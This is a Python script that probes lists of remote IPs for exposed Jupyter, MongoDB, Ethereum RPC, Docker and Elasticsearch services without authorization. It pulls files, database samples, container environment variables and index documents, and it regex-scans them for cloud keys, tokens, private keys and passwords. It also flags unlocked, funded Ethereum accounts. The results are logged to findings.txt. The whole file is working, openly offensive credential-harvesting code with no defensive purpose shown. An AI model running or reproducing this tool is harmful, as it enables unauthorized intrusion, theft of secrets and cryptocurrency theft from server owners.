#!/usr/bin/env python3
import json, re, sys
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

TIMEOUT = 6
KEY_RE = re.compile(
    r'(AKIA[0-9A-Z]{16}'
    r'|(?:sk|rk|pk)[-_][a-zA-Z0-9]{20,}'
    r'|ghp_[a-zA-Z0-9]{36}'
    r'|gho_[a-zA-Z0-9]{36}'
    r'|xox[baprs]-[0-9A-Za-z\-]{10,}'
    r'|-----BEGIN [A-Z ]+ KEY-----'
    r'|[0-9a-fA-F]{64}'
    r'|(?:password|passwd|secret|token|api.?key|private.?key|access.?key)\s*[=:]\s*["\']?([^\s"\'<>]{8,50}))',
    re.IGNORECASE
)

def find_secrets(text):
    return list(set(m.group(0)[:120] for m in KEY_RE.finditer(text)))

def probe_jupyter(ip):
    try:
        r = requests.get(f'http://{ip}:8888/api/contents', timeout=TIMEOUT)
        if r.status_code != 200 or 'content' not in r.text:
            return None
        files = r.json().get('content', [])
        result = {'ip': ip, 'port': 8888, 'type': 'jupyter',
                  'files': [f['name'] for f in files], 'secrets': []}
        for f in files[:15]:
            name = f.get('name', '')
            if not name.endswith(('.ipynb', '.py', '.env', '.cfg', '.json', '.yaml', '.yml')):
                continue
            try:
                nb = requests.get(f'http://{ip}:8888/api/contents/{name}', timeout=TIMEOUT)
                if nb.status_code == 200:
                    secrets = find_secrets(nb.text)
                    if secrets:
                        result['secrets'].extend(secrets[:10])
                        print(f'  JUPYTER SECRETS: {ip} file={name} count={len(secrets)}', flush=True)
                        for s in secrets[:3]:
                            print(f'    -> {s[:80]}', flush=True)
            except:
                pass
        print(f'  JUPYTER: {ip} files={len(files)} secrets={len(result["secrets"])}', flush=True)
        return result
    except:
        return None

def probe_mongo(ip):
    try:
        import pymongo
        client = pymongo.MongoClient(ip, 27017,
            serverSelectionTimeoutMS=TIMEOUT*1000,
            connectTimeoutMS=TIMEOUT*1000)
        dbs = client.list_database_names()
        result = {'ip': ip, 'port': 27017, 'type': 'mongo',
                  'databases': dbs, 'collections': {}, 'samples': {}, 'secrets': []}
        for db_name in dbs[:8]:
            if db_name in ('admin', 'local', 'config'):
                continue
            db = client[db_name]
            cols = db.list_collection_names()[:5]
            result['collections'][db_name] = cols
            for col in cols[:3]:
                try:
                    doc = db[col].find_one()
                    if doc:
                        doc.pop('_id', None)
                        sample = str(doc)[:300]
                        result['samples'][f'{db_name}.{col}'] = sample
                        secrets = find_secrets(sample)
                        if secrets:
                            result['secrets'].extend(secrets)
                            print(f'  MONGO SECRETS: {ip} {db_name}.{col}', flush=True)
                except:
                    pass
        print(f'  MONGO: {ip} dbs={dbs}', flush=True)
        return result
    except:
        return None

def probe_eth(ip):
    try:
        r = requests.post(f'http://{ip}:8545',
            json={'jsonrpc': '2.0', 'method': 'eth_accounts', 'params': [], 'id': 1},
            timeout=TIMEOUT)
        accounts = r.json().get('result', [])
        result = {'ip': ip, 'port': 8545, 'type': 'eth',
                  'accounts': accounts, 'balances': {}, 'total_eth': 0}
        for addr in accounts[:10]:
            bal = requests.post(f'http://{ip}:8545',
                json={'jsonrpc': '2.0', 'method': 'eth_getBalance',
                      'params': [addr, 'latest'], 'id': 1},
                timeout=TIMEOUT).json().get('result', '0x0')
            eth = int(bal, 16) / 1e18
            result['balances'][addr] = eth
            result['total_eth'] += eth
        if result['total_eth'] > 0:
            print(f'  ETH FUNDED: {ip} total={result["total_eth"]:.4f} ETH', flush=True)
        elif accounts:
            print(f'  ETH UNLOCKED (empty): {ip} accounts={accounts}', flush=True)
        return result if accounts else None
    except:
        return None

def probe_docker(ip):
    try:
        r = requests.get(f'http://{ip}:2375/info', timeout=TIMEOUT)
        if 'ServerVersion' not in r.text:
            return None
        info = r.json()
        result = {'ip': ip, 'port': 2375, 'type': 'docker',
                  'version': info.get('ServerVersion'),
                  'containers': info.get('Containers', 0),
                  'running': info.get('ContainersRunning', 0),
                  'secrets': []}
        cts = requests.get(f'http://{ip}:2375/containers/json', timeout=TIMEOUT).json()
        for ct in cts[:8]:
            cid = ct.get('Id', '')[:12]
            image = ct.get('Image', '?')
            try:
                detail = requests.get(
                    f'http://{ip}:2375/containers/{cid}/json', timeout=TIMEOUT).json()
                env = detail.get('Config', {}).get('Env', [])
                for e in env:
                    secrets = find_secrets(e)
                    if secrets:
                        result['secrets'].extend(secrets)
                        print(f'  DOCKER SECRETS: {ip} image={image}: {e[:80]}', flush=True)
            except:
                pass
        print(f'  DOCKER: {ip} v={info.get("ServerVersion")} running={info.get("ContainersRunning",0)}', flush=True)
        return result
    except:
        return None

def probe_elastic(ip):
    try:
        r = requests.get(f'http://{ip}:9200', timeout=TIMEOUT)
        if 'cluster_name' not in r.text:
            return None
        info = r.json()
        indices_r = requests.get(f'http://{ip}:9200/_cat/indices?format=json', timeout=TIMEOUT)
        indices = [i.get('index') for i in indices_r.json()[:10]] if indices_r.status_code == 200 else []
        result = {'ip': ip, 'port': 9200, 'type': 'elastic',
                  'cluster': info.get('cluster_name'), 'indices': indices, 'secrets': []}
        for idx in [i for i in indices if not i.startswith('.')][:3]:
            try:
                hits = requests.get(
                    f'http://{ip}:9200/{idx}/_search?size=1', timeout=TIMEOUT).json()
                for doc in hits.get('hits', {}).get('hits', []):
                    src = json.dumps(doc.get('_source', {}))
                    secrets = find_secrets(src)
                    if secrets:
                        result['secrets'].extend(secrets)
                        print(f'  ELASTIC SECRETS: {ip} idx={idx}', flush=True)
            except:
                pass
        print(f'  ELASTIC: {ip} cluster={info.get("cluster_name")} indices={len(indices)}', flush=True)
        return result
    except:
        return None

PROBERS = {
    8888: probe_jupyter,
    27017: probe_mongo,
    8545: probe_eth,
    2375: probe_docker,
    9200: probe_elastic,
}

candidates = []
try:
    with open('candidates.txt') as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                parts = line.split(':')
                try:
                    candidates.append((parts[0], int(parts[1])))
                except:
                    pass
except Exception as e:
    print(f'No candidates.txt: {e}')
    sys.exit(0)

print(f'Deep probing {len(candidates)} candidates (30 workers)...', flush=True)

findings = []
with ThreadPoolExecutor(max_workers=30) as ex:
    futures = {ex.submit(PROBERS[port], ip): (ip, port)
               for ip, port in candidates if port in PROBERS}
    for fut in as_completed(futures):
        try:
            result = fut.result()
            if result:
                findings.append(result)
        except:
            pass

secrets_count = sum(1 for f in findings if f.get('secrets'))
eth_funded = [f for f in findings if f.get('type') == 'eth' and f.get('total_eth', 0) > 0]

print(f'\nTotal findings: {len(findings)}')
print(f'With secrets: {secrets_count}')
print(f'ETH funded: {len(eth_funded)}')
for r in eth_funded:
    print(f'  FUNDED: {r["ip"]} = {r["total_eth"]:.4f} ETH')

with open('findings.txt', 'w') as out:
    for r in findings:
        out.write(json.dumps(r) + '\n')

print(f'Written to findings.txt')
